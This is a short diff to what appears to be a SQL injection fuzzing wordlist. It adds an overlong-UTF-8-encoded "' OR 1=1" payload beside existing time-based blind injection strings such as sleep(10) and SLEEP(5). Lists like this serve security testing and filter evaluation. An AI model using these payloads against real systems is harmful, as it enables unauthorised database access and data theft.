@@ -97,6 +97,7 @@
 %2A%7C
 %2c(select%20*%20from%20(select(sleep(10)))a)
 %7C
+%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11
 &
 &&SLEEP(5)
 &&SLEEP(5)#
